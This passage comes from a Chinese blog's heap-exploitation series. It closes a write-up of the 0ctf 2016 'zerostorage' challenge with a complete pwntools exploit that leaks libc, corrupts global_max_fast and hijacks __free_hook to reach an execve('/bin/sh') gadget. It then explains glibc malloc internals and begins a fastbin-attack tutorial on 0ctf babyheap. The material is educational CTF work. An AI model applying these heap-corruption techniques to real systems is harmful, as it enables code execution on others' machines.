<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gef➤  heap chunks</span><br><span class="line">Chunk(addr=0x555555758010, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758010     43 43 43 43 43 43 43 43 43 43 43 43 43 43 43 43    CCCCCCCCCCCCCCCC]</span><br><span class="line">Chunk(addr=0x5555557580a0, size=0x90, flags=PREV_INUSE)</span><br><span class="line">    [0x00005555557580a0     42 42 42 42 42 42 42 42 42 42 42 42 42 42 42 42    BBBBBBBBBBBBBBBB]</span><br><span class="line">Chunk(addr=0x555555758130, size=0x200, flags=PREV_INUSE)</span><br><span class="line">    [0x0000555555758130     4f 47 fc f7 ff 7f 00 00 0a 47 47 47 47 47 47 47    OG.......GGGGGGG]</span><br><span class="line">Chunk(addr=0x555555758330, size=0x20ce0, flags=PREV_INUSE)  ←  top chunk</span><br><span class="line">gef➤  x/gx 0x7ffff7fc2b20 + 8 + 30 * 8</span><br><span class="line">0x7ffff7fc2c18: 0x0000555555758120</span><br><span class="line">gef➤  x/gx 0x0000555555758120</span><br><span class="line">0x555555758120: 0x0000000000000000</span><br><span class="line">gef➤  x/gx 0x0000555555758120 + 8</span><br><span class="line">0x555555758128: 0x0000000000000201</span><br><span class="line">gef➤  x/gx 0x0000555555758120 + 8 +8</span><br><span class="line">0x555555758130: 0x00007ffff7fc474f</span><br><span class="line"></span><br><span class="line">malloc_free_hook_target_addr的地址就是0x00007ffff7fc474f</span><br></pre></td></tr></table></figure>
<p>我们已经成功修改了fd指针指向了我们想要的区域。<br>下面需要进行两次分配0x200 chunk。</p>
<p>第一次分配弹出无用的fastbin，第二次分配得到对free_hook的内存的指针。<br>之后就是往里面写数据，写数据的时候还有一个坑，就是要写入\x00字符，否则printf无法返回，程序会卡在那里。<br>原因是free_hook附近的数据显然是有用的，如果我们修改了就有可能导致程序出问题。</p>
<p>之后就是调用free实现对free_hook的劫持。至此我们已经拿到了PC的控制权，PWN！</p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>这道题的难度可谓非常大，在调试过程中出现了太多的问题，本文也是边调试编写，可能前半部分有问题，但是我都记录下来了，不可能我们一蹴而就的直接给出最优解，正确的答案是简练的但是却缺少了很多思维过程，这是我在做这道题搜寻资料的时候发现大家都是拿着别人写好的exp跑一遍就行了，但是exp能看懂，不代表你解理解了真正的解题思路，希望本篇这种完整的解题记录能给大家一点启发。</p>
<h3 id="我的利用代码"><a href="#我的利用代码" class="headerlink" title="我的利用代码"></a>我的利用代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">target = process(&quot;./zerostorage_long&quot;, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span><br><span class="line">elf = ELF(&quot;./zerostorage_long&quot;)</span><br><span class="line">libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line"># gdb.attach(target)</span><br><span class="line"># recv_str = target.recv()</span><br><span class="line"># print recv_str</span><br><span class="line"></span><br><span class="line">raw_input(&quot;Begin...&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def insert(size, data):</span><br><span class="line">    target.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    target.sendline(&quot;1&quot;)</span><br><span class="line">    target.recvuntil(&quot;Length of new entry: &quot;)</span><br><span class="line">    target.sendline(str(size))</span><br><span class="line">    target.recvuntil(&quot;Enter your data: &quot;)</span><br><span class="line">    target.sendline(data)</span><br><span class="line"></span><br><span class="line">def merge(index1, index2):</span><br><span class="line">    target.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    target.sendline(&quot;3&quot;)</span><br><span class="line">    target.recvuntil(&quot;Merge from Entry ID: &quot;)</span><br><span class="line">    target.sendline(str(index1))</span><br><span class="line">    target.recvuntil(&quot;Merge to Entry ID: &quot;)</span><br><span class="line">    target.sendline(str(index2))</span><br><span class="line"></span><br><span class="line">def view(index):</span><br><span class="line">    target.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    target.sendline(&quot;5&quot;)</span><br><span class="line">    target.recvuntil(&quot;Entry ID: &quot;)</span><br><span class="line">    target.sendline(str(index))</span><br><span class="line">    target.recvline()</span><br><span class="line">    ret = target.recvline()</span><br><span class="line">    return ret</span><br><span class="line"></span><br><span class="line">def edit(index, size, data):</span><br><span class="line">    target.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    target.sendline(&quot;2&quot;)</span><br><span class="line">    target.recvuntil(&quot;Entry ID: &quot;)</span><br><span class="line">    target.sendline(str(index))</span><br><span class="line">    target.recvuntil(&quot;Length of entry: &quot;)</span><br><span class="line">    target.sendline(str(size))</span><br><span class="line">    target.recvuntil(&quot;Enter your data: &quot;)</span><br><span class="line">    target.sendline(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    target.recvuntil(&quot;Your choice: &quot;)</span><br><span class="line">    target.sendline(&quot;4&quot;)</span><br><span class="line">    target.recvuntil(&quot;Entry ID: &quot;)</span><br><span class="line">    target.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def system_input(cmd):</span><br><span class="line">    target.sendline(cmd)</span><br><span class="line"></span><br><span class="line"># Create two chunks, must prevent consolidate into forest</span><br><span class="line">insert(0x20, &quot;A&quot; * 0x1f)  # 0</span><br><span class="line">insert(0x20, &quot;B&quot; * 0x1f)  # 1</span><br><span class="line"></span><br><span class="line">length = 0x100 - 0x8</span><br><span class="line">insert(length,&quot;G&quot;*(length-1))    # 2</span><br><span class="line"></span><br><span class="line"># Merge 0 chunk with itself, use after free</span><br><span class="line">merge(0, 0)               # 把0 放到了unsorted bin上了，同时也可以访问0, ## 3</span><br><span class="line"># print(target.recv())</span><br><span class="line">leak_main_arena_88 = u64(view(3)[0:8])</span><br><span class="line"></span><br><span class="line"># 0x3c3b20 + 88 main_arena_88 offset   0x7ffff7fc2b78</span><br><span class="line"># 0x3c5848   max_fast_addr offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 0x7ffff7fc2b20是arena的地址</span><br><span class="line"># fast bin的地址0x7ffff7fc2b20 +8</span><br><span class="line"># fast bin 0x200对应的内存地址0x7ffff7fc2b20 + 8 + 30 * 8</span><br><span class="line">offset1 = 0x1cd0</span><br><span class="line">max_fast_addr = leak_main_arena_88 + offset1</span><br><span class="line"></span><br><span class="line">edit(3,0x10,p64(leak_main_arena_88) + p64(max_fast_addr- 2*8))</span><br><span class="line"></span><br><span class="line">insert(0x20,&quot;C&quot;*0x1f)    # 0</span><br><span class="line"></span><br><span class="line"># print(target.recv())</span><br><span class="line"></span><br><span class="line">merge(2,2)              # 4</span><br><span class="line"></span><br><span class="line"># print(target.recv())</span><br><span class="line"></span><br><span class="line">malloc_free_hook_target_addr = 0x1bdf + leak_main_arena_88 - 8</span><br><span class="line">edit(4, 0x1f0, p64(malloc_free_hook_target_addr) + (0x1f0-8-1)*&#x27;I&#x27;)  </span><br><span class="line"></span><br><span class="line">offset2 = 0x1c30</span><br><span class="line">free_hook_addr = leak_main_arena_88 + offset2</span><br><span class="line">num_to_write = (free_hook_addr - (malloc_free_hook_target_addr + 2 * 8 ))</span><br><span class="line"></span><br><span class="line">execve_bin_sh_addr = leak_main_arena_88 - 0x37e917</span><br><span class="line"></span><br><span class="line">insert(0x1f0,&#x27;H&#x27;*(0x1f0-1))</span><br><span class="line"># insert(0x1f0,&#x27;H&#x27;*(0x1f0-1))</span><br><span class="line"></span><br><span class="line"># insert(0x1f0,&#x27;H&#x27;*(0x1f0-1))</span><br><span class="line"></span><br><span class="line">insert(0x1f0,num_to_write * &#x27;\x00&#x27; + p64(execve_bin_sh_addr) + &#x27;\x00&#x27; * (0x1f0-num_to_write-8-1))   # 6</span><br><span class="line"># insert(0x1f0,num_to_write * &#x27;E&#x27; + p64(execve_bin_sh_addr))   # 6</span><br><span class="line"></span><br><span class="line"># insert(0x20, &quot;A&quot; * 0x1f)  # 0</span><br><span class="line"># print(&#x27;haha&#x27;)</span><br><span class="line">delete(1)</span><br><span class="line">system_input(&#x27;ls&#x27;)</span><br><span class="line">print(target.recv())</span><br></pre></td></tr></table></figure>

<p>最后虽然成功跳转了pc，但是没有执行execve(‘/bin/sh’)成功，具体原因不想再研究了，希望同学可以指点下。</p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
<li><a href="https://guyinatuxedo.github.io/31-unsortedbin_attack/0ctf16_zerostorage/index.html">https://guyinatuxedo.github.io/31-unsortedbin_attack/0ctf16_zerostorage/index.html</a></li>
<li><a href="http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/">http://brieflyx.me/2016/ctf-writeups/0ctf-2016-zerostorage/</a></li>
<li><a href="https://hhdx.xyz/2020/07/12/How2heap-unsorted-bin-attack-0ctf2016-zerostorage/">https://hhdx.xyz/2020/07/12/How2heap-unsorted-bin-attack-0ctf2016-zerostorage/</a></li>
</ol>
<h3 id="libc-unsorted-bin的出入顺序"><a href="#libc-unsorted-bin的出入顺序" class="headerlink" title="libc unsorted bin的出入顺序"></a>libc unsorted bin的出入顺序</h3><ol>
<li><p>分析源码发现，当free的时候，往unsorted bin中添加chunk，会将unsorted bin -&gt;fd 指向这个新加入的chunk，然后这个chunk的bk指向unsorted bin，这个chunk的fd指向原来的unsorted bin -&gt;fd, 并且让原来的unsorted bin-&gt;fd的bk指向这个新的chunk</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">     bck = unsorted_chunks(av);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">     if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = &quot;free(): corrupted unsorted chunks&quot;;</span><br><span class="line">  goto errout;</span><br><span class="line">&#125;</span><br><span class="line">     p-&gt;fd = fwd;    //p是新chunk，新chunk的fd指向本来的头部</span><br><span class="line">     p-&gt;bk = bck;    //新chunk的bk指向unsorted bin</span><br><span class="line">     if (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = NULL;</span><br><span class="line">  p-&gt;bk_nextsize = NULL;</span><br><span class="line">&#125;</span><br><span class="line">     bck-&gt;fd = p;   // unsorted-&gt;fd指向新chunk</span><br><span class="line">     fwd-&gt;bk = p;   // 原来的头部的bk指向新chunk</span><br><span class="line"></span><br><span class="line">     set_head(p, size | PREV_INUSE);</span><br><span class="line">     set_foot(p, size);</span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li>
<li><p>当从unsorted bin中取元素出来的时候是先取的unsorted bin -&gt;bk指向的元素，取元素会重写两个指针。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">victim = unsorted_chunks (av)-&gt;bk)  //取出的元素的unsorted bin的bk</span><br><span class="line">...</span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line">...</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;   // unsorted bin-&gt;bk指向被取出的元素的上一个元素</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);   // 被取出元素的上一个元素的fd指向unsorted bin</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="malloc-函数的基本逻辑"><a href="#malloc-函数的基本逻辑" class="headerlink" title="malloc 函数的基本逻辑"></a>malloc 函数的基本逻辑</h3><p><img src="pastimages/2021-06-02-11-55-10.png"></p>
]]></content>
      <categories>
        <category>堆利用</category>
      </categories>
      <tags>
        <tag>堆利用</tag>
      </tags>
  </entry>
  <entry>
    <title>堆利用系列四：Fast Bin Attack</title>
    <url>/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BFastbin-Attack/</url>
    <content><![CDATA[<h2 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>通过一道babyheap例题讲解fastbin attack，同时会涉及到一个泄露libc地址的方法，绕过GOT写保护劫持PC的方法，一个绕过Fastbin 大小检测的方法，还有对glibc相关源码的一些讲解。</p>
<h3 id="涉及到的glibc的知识"><a href="#涉及到的glibc的知识" class="headerlink" title="涉及到的glibc的知识"></a>涉及到的glibc的知识</h3><p>要把这道题做出来，需要对下面的基础知识有所了解。</p>
<h4 id="源码中MIN-CHUNK-SIZE大小是多少"><a href="#源码中MIN-CHUNK-SIZE大小是多少" class="headerlink" title="源码中MIN_CHUNK_SIZE大小是多少"></a>源码中MIN_CHUNK_SIZE大小是多少</h4><p>MIN_CHUNK_SIZE指的是一个CHUNK最小为多大<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span><br></pre></td></tr></table></figure></p>
<p>是fd_nextsize在malloc_chunk中的偏移，并不是malloc_chunk这个数据结构的大小<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct malloc_chunk &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */</span><br><span class="line">  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */</span><br><span class="line"></span><br><span class="line">  struct malloc_chunk* fd;         /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk;</span><br><span class="line"></span><br><span class="line">  /* Only used for large blocks: pointer to next larger size.  */</span><br><span class="line">  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>因为每个chunk都会有prev_size, size， fd,bk这几个成员，但是只有large chunk拥有fd_nextsize和bk_nextsize</p>
<h4 id="MINSIZE"><a href="#MINSIZE" class="headerlink" title="MINSIZE"></a>MINSIZE</h4><p>MINSIZE是指用户能够得到的最小的chunk 大小，与MIN_CHUNK_SIZE区别是它要求是对其的，所以是可能大于MIN_CHUNK_SIZE的<br>但是对于32位和64位的x86类型来说，MINSIZE与MIN_CHUNK_SIZE大小是一样的。32位MINSIZE=MIN_CHUNK_SIZE=16bytes,64位为32bytes。</p>
<h4 id="chunk与用户使用的mem之间的转换"><a href="#chunk与用户使用的mem之间的转换" class="headerlink" title="chunk与用户使用的mem之间的转换"></a>chunk与用户使用的mem之间的转换</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br><span class="line">#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br></pre></td></tr></table></figure>
<h4 id="MALLOC-ALIGN-MASK"><a href="#MALLOC-ALIGN-MASK" class="headerlink" title="MALLOC_ALIGN_MASK"></a>MALLOC_ALIGN_MASK</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span><br></pre></td></tr></table></figure>
<h4 id="MALLOC-ALIGN-MASK-1"><a href="#MALLOC-ALIGN-MASK-1" class="headerlink" title="MALLOC_ALIGN_MASK"></a>MALLOC_ALIGN_MASK</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#  define MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span><br><span class="line">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span><br></pre></td></tr></table></figure>
<p>经过我的测试：<br><code>x86 32情况下，__alignof__ (long double)为4</code><br><code>x64 情况下， __alignof__ (long double)为16</code></p>
<p>所以32位下，MALLOC_ALIGNMENT的值为8，MALLOC_ALIGN_MASK  为7；<br>64位下MALLOC_ALIGNMENT值为16，MALLOC_ALIGN_MASK为15.</p>
<h4 id="request2size-req"><a href="#request2size-req" class="headerlink" title="request2size(req)"></a>request2size(req)</h4><p>malloc(req)，到底会生成多大的chunk，是需要用 request2size(req)确定<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define request2size(req)                                         \</span><br><span class="line">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span><br><span class="line">   MINSIZE :                                                      \</span><br><span class="line">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span><br></pre></td></tr></table></figure></p>
<p>那么在32位下的req如何转换：<br>1.首先计算req + 4 + 7是否小于16<br>2.如果小于16,那么就转换为16<br>3.如果大于16就转换为(req + 4 + 7) &amp; ~7 就是 (req+11)&amp;0xfff8<br>自己写了个脚本测试了几个例子<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def request2size(req,word):</span><br><span class="line">    sz_32 = 4</span><br><span class="line">    sz_64 = 8</span><br><span class="line">    mask_32= 7</span><br><span class="line">    mask_64 = 15</span><br><span class="line">    min_size_32 = 16</span><br><span class="line">    min_size_64 = 32</span><br><span class="line">    if word == 32:</span><br><span class="line">        if (req + sz_32 + mask_32 ) &lt; min_size_32:</span><br><span class="line">            return min_size_32</span><br><span class="line">        else:</span><br><span class="line">            return (req + sz_32 + mask_32 ) &amp; ~mask_32</span><br><span class="line">    elif word == 64:</span><br><span class="line">        if (req + sz_64 + mask_64 ) &lt; min_size_64:</span><br><span class="line">            return min_size_64</span><br><span class="line">        else:</span><br><span class="line">            return (req + sz_64 + mask_64 ) &amp; ~mask_64</span><br></pre></td></tr></table></figure></p>
<p>32 位下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">req:0, to:16</span><br><span class="line">req:1, to:16</span><br><span class="line">req:2, to:16</span><br><span class="line">req:3, to:16</span><br><span class="line">req:4, to:16</span><br><span class="line">req:5, to:16</span><br><span class="line">req:6, to:16</span><br><span class="line">req:7, to:16</span><br><span class="line">req:8, to:16</span><br><span class="line">req:9, to:16</span><br><span class="line">req:10, to:16</span><br><span class="line">req:11, to:16</span><br><span class="line">req:12, to:16</span><br><span class="line">req:13, to:24</span><br><span class="line">req:14, to:24</span><br></pre></td></tr></table></figure></p>
<p>可以看到，如果malloc()的大小小于等于12则最终得到的chunk大小为16</p>
<p>64位下的测试结果<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">req:0x70, to:0x80</span><br><span class="line">req:0x71, to:0x80</span><br><span class="line">req:0x72, to:0x80</span><br><span class="line">req:0x73, to:0x80</span><br><span class="line">req:0x74, to:0x80</span><br><span class="line">req:0x75, to:0x80</span><br><span class="line">req:0x76, to:0x80</span><br><span class="line">req:0x77, to:0x80</span><br><span class="line">req:0x78, to:0x80</span><br><span class="line">req:0x79, to:0x90</span><br></pre></td></tr></table></figure></p>
<p>可以看到，当我们malloc申请的大小为0x78的时候，最终分配的chunk大小是0x80，这感觉有点违背直觉，因为chunk header就是16个字节，那么分配0x78大小的时候至少chunk应该是0x78 + 0x10 = 0x88，至少应该是0x88，如果考虑16字节对齐的情况下，那么大小应该是0x90才对的？这是一个值得思考的问题，大家可以考虑一下为什么是0x80而不是0x90.</p>
<h4 id="往unsorted-bin中插入一个chunk"><a href="#往unsorted-bin中插入一个chunk" class="headerlink" title="往unsorted bin中插入一个chunk"></a>往unsorted bin中插入一个chunk</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">     bck = unsorted_chunks(av);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">     if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = &quot;free(): corrupted unsorted chunks&quot;;</span><br><span class="line">  goto errout;</span><br><span class="line">&#125;</span><br><span class="line">     p-&gt;fd = fwd;</span><br><span class="line">     p-&gt;bk = bck;</span><br><span class="line">     if (!in_smallbin_range(size))</span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize = NULL;</span><br><span class="line">  p-&gt;bk_nextsize = NULL;</span><br><span class="line">&#125;</span><br><span class="line">     bck-&gt;fd = p;</span><br><span class="line">     fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">     set_head(p, size | PREV_INUSE);</span><br><span class="line">     set_foot(p, size);</span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>当free一个合适大小的chunk的时候，会往unsorted bin中插入这个chunk, 插入一个chunk的时候需要对四个指针进行写，分别是该chunk的fd和bk指针，以及前后相邻的两个chunk的一个bk和一个fd指针。</p>
<h4 id="malloc一个在unsorted-bin上的chunk"><a href="#malloc一个在unsorted-bin上的chunk" class="headerlink" title="malloc一个在unsorted bin上的chunk"></a>malloc一个在unsorted bin上的chunk</h4><p>如果unsorted bin有比申请大的chunk，就会直接把它分割，让剩下的chunk加入到unsorted bin 链表中。<br>具体操作如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">        /* We cannot assume the unsorted list is empty and therefore</span><br><span class="line">            have to perform a complete insert here.  */</span><br><span class="line">        bck = unsorted_chunks (av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = &quot;malloc(): corrupted unsorted chunks 2&quot;;</span><br><span class="line">            goto errout;</span><br><span class="line">        &#125;</span><br><span class="line">        remainder-&gt;bk = bck;</span><br><span class="line">        remainder-&gt;fd = fwd;</span><br><span class="line">        bck-&gt;fd = remainder;</span><br><span class="line">        fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">        /* advertise as last remainder */</span><br><span class="line">        if (in_smallbin_range (nb))</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        if (!in_smallbin_range (remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">            remainder-&gt;bk_nextsize = NULL;</span><br><span class="line">        &#125;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot (remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    void *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    return p;</span><br></pre></td></tr></table></figure></p>
<h4 id="初始化bins"><a href="#初始化bins" class="headerlink" title="初始化bins"></a>初始化bins</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for (i = 1; i &lt; NBINS; ++i)</span><br><span class="line">   &#123;</span><br><span class="line">     bin = bin_at (av, i);</span><br><span class="line">     bin-&gt;fd = bin-&gt;bk = bin;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h3 id="0ctf-babyheap"><a href="#0ctf-babyheap" class="headerlink" title="0ctf babyheap"></a>0ctf babyheap</h3><p>题目文件下载地址<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/fastbin-attack/2017_0ctf_babyheap" target="_blank" rel="noopener">babyheap</a></p>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>目标是泄露libc的地址，借助的是泄露unsorted bin所在的地址进而推导出其他地址。<br>因为unsroted bin所在的数据结构是在libc的读写区分配的，因此是可以借助它进行地址泄露的。</p>
<p>泄露unsorted bin地址的方法是把unsorted bin的头部chunk的bk指针给泄露出来。<br>我们看一个正常的拥有两个元素的unsorted bin的结构<br><img src="/images/heap_exp/2021-05-28-11-11-50.png" alt></p>
<p>这个头部chunk的bk指针就是指向的是<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure></p>
<p><code>unsorted_chunks(av)</code>这个地址到底是哪里<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define unsorted_chunks(M)          (bin_at (M, 1))</span><br><span class="line"></span><br><span class="line">#define bin_at(m, i) \</span><br><span class="line">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))			      \</span><br><span class="line">             - offsetof (struct malloc_chunk, fd))</span><br></pre></td></tr></table></figure></p>
<p>av就是main_arena，我们把1代入bin_at得到unsorted_chunks(av)的地址为main_arena-&gt;bins - chunk header的大小就是main_arena-&gt;top的地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">struct malloc_state</span><br><span class="line">&#123;</span><br><span class="line">  /* Serialize access.  */</span><br><span class="line">  mutex_t mutex;</span><br><span class="line"></span><br><span class="line">  /* Flags (formerly in max_fast).  */</span><br><span class="line">  int flags;</span><br><span class="line"></span><br><span class="line">  /* Fastbins */</span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  /* Base of the topmost chunk -- not otherwise kept in a bin */</span><br><span class="line">  mchunkptr top;</span><br><span class="line"></span><br><span class="line">  /* The remainder from the most recent split of a small request */</span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">  /* Normal bins packed as described above */</span><br><span class="line">  mchunkptr bins[NBINS * 2 - 2];</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  static struct malloc_state main_arena =</span><br><span class="line">&#123;</span><br><span class="line">  .mutex = _LIBC_LOCK_INITIALIZER,</span><br><span class="line">  .next = &amp;main_arena,</span><br><span class="line">  .attached_threads = 1</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这段代码是在malloc.c文件中中定义的，编译后main_arena就是保存了unsorted bin链表，我们计算一下mchunkptr bins[NBINS * 2 - 2];这个数组相对malloc_state结构的偏移。<br>首先要确定 mfastbinptr fastbinsY[NFASTBINS];这个长度是多少，要确定NFASTBINS的大小<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#define NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span><br><span class="line"></span><br><span class="line">#define MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br><span class="line"></span><br><span class="line">#define fastbin_index(sz) \</span><br><span class="line">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></pre></td></tr></table></figure></p>
<p>64位下，SIZE_SZ的值为8， MAX_FAST_SIZE为160，代入request2size（160）得到176， 进一步代入fastbin_index得到NFASTBINS为10<br>32位下， SIZE_SZ的值为4， MAX_FAST_SIZE为80， 代入request2size（80） 得到88， 进一步代入fastbin_index得到NFASTBINS为10</p>
<p>所以无论在32位还是64位下， NFASTBINS均为10，就是都是有10个mfastbinptr指针，那么总大小就是10*8 = 80<br>进而得到main_arena-&gt;top的偏移为 4 + 4 + 80 = 88=0x58, 在ida的local中定义新的数据结构看下偏移也是0x58<br><img src="/images/heap_exp/2021-05-27-17-02-02.png" alt><br>与我们计算的吻合，所以理论上头部chunk的bk指针指向的地址就是main_arena + 88字节的值</p>
<p>为了泄露main_arena + 88这个值，我们首先需要溢出chunk1，使其修改chunk2的prev size和size字段<br><img src="/images/heap_exp/2021-05-28-11-38-36.png" alt><br>chunk2的prev size从0x80改为0x180，size从0x101改为0x100，这样可以将chunk1标识为空闲块。<br>然后再free chunk2，触发错误的后向融合，chunk1连同chunk0和chunk2一起被当做一个大的chunk放到unsorted bin上。<br><img src="/images/heap_exp/2021-05-28-11-48-10.png" alt><br>在gdb中观察unsorted bin的情况<br><img src="/images/heap_exp/2021-05-27-17-32-32.png" alt><br>可以看到，如我们的预期，unsroted bin中有一个chunk,大小是0x280。</p>
<p>当我们malloc 0xf0之后，会分割这个0x280的chunk，剩下0x180大小的chunk，并且重写unsorted bin的fd和bk以及新的头部chunk的fd bk指针<br><img src="/images/heap_exp/2021-05-28-11-58-27.png" alt><br>这个新的unsorted bin链表头部chunk实际上就是我们的的chunk1，而chunk1是可以被我们打印的，因为他没有被我们人为的free。<br>因此我们可以通过打印chunk1的数据部分泄露他的bk和fd指针内容，由于unsorted bin上只有一个元素，所以bk与fd相等都是指向main_arena+88偏移的地址。<br>我们利用逻辑打印这个chunk1的内容<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; leak_address = res.split(&apos;\n&apos;)[1][0:8]</span><br><span class="line">&gt;&gt;&gt; hex(u(leak_address))</span><br><span class="line">&apos;0x7ffff7fc2b78&apos;</span><br></pre></td></tr></table></figure></p>
<p>main_arena = 0x7ffff7fc2b78 - 88 = 0x7ffff7fc2b20<br>我们利用GEF的heap arenas看一下是否相同<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gef➤  heap arenas                                                                                     </span><br><span class="line">Arena (base=0x7ffff7fc2b20, top=0x5555557572c0, last_remainder=0x555555757100, next=0x7ffff7fc2b20, ne</span><br><span class="line">xt_free=0x0, system_mem=0x21000)</span><br></pre></td></tr></table></figure></p>
<p>所以我们已经成功泄露了main_arena+88的地址。我们可以基于此得到任意想要的libc偏移地址。</p>
<h3 id="劫持控制流"><a href="#劫持控制流" class="headerlink" title="劫持控制流"></a>劫持控制流</h3><p>由于这个二进制开启了PIE，因此不能通过改写GOT的方式实现控制流劫持。但是我们可以通过改写__malloc_hook这个指针的方式实现控制流劫持。如果 malloc_hook 和free_hook的值存在，则会调用malloc_hook或者free_hook指向的地址。</p>
